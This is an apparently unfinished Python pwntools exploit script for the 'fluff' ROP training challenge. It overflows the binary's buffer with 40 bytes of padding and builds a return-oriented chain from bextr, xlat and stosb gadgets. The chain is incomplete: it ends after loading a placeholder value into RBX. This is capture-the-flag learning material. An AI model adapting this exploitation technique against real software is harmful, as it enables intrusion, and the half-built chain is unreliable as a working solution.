import ctypes
from pwn import *

def prepare_rbx(target, rop):
    # Constants
    pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget = p64(0x0040062a) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    magic_const = 0x3ef2
    
    # ROP Chaining
    rop.raw(pop_rdx_pop_rcx_add_rcx_bextr_ret_gadget)
    rop.raw(p64(0x4000)) # Extract 64 bits from offset 0 in RCX. Results will be written to RBX.
    #  rop.raw(p64(ctypes.c_ulong(target - magic_const).value))
    rop.raw(p64(target - magic_const))

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './fluff'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x0040062a"
pid = gdb.attach(io, gdbscript=gdbscript)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = 0x00601028
stosb_gadget = p64(0x00400639)                                  # stosb byte [rdi], al; ret;
xlat_ret_gadget = p64(0x00400628)                               # xlatb; ret;
pop_rdi_ret = p64(0x004006a3)                                   # pop rdi; ret;

# Prepare the RBX register
target = 0xdeadbeefdeadbeef
prepare_rbx(target, rop)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()

